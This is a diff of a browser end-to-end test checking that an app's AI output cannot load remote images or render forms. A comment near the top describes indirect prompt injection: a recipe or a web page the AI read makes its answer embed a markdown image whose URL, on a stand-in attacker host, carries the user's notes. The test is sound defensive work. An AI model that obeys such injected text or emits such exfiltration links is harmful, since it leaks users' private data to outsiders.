@@ -62,7 +62,7 @@ test('amendment 4: nav-home is reachable from tool, add and settings', async ({ 
 // which keeps <img src="https://…">, <form>, <input> and <style>. A recipe, or
 // a web page the AI read, can make the answer embed
 // ![](https://attacker/?d=<brain notes>), and the browser fetches it with no click.
-test('AI output cannot make the browser load remote images or render forms', async ({ page, net }) => {
+test('AI output cannot make the browser load remote images or render forms', async ({ page, net, cspViolations }) => {
   await setup(page, { mode: 'manual' })
   await openTool(page, 'hello-hub')
   await fillHello(page)
@@ -86,4 +86,7 @@ test('AI output cannot make the browser load remote images or render forms', asy
   const leaks = net.requests.filter((r) => r.url.includes('evil.example'))
   net.violations.splice(0, net.violations.length, ...net.violations.filter((v) => !v.includes('evil.example')))
   expect(leaks.map((r) => r.url)).toEqual([])
+  // Attack payload: only Chromium's harmless inline-style noise from DOMPurify's inert parse is tolerated.
+  expect(cspViolations.filter((v) => !/style-src|inline style|base-uri|base URI/i.test(v))).toEqual([])
+  cspViolations.length = 0
 })
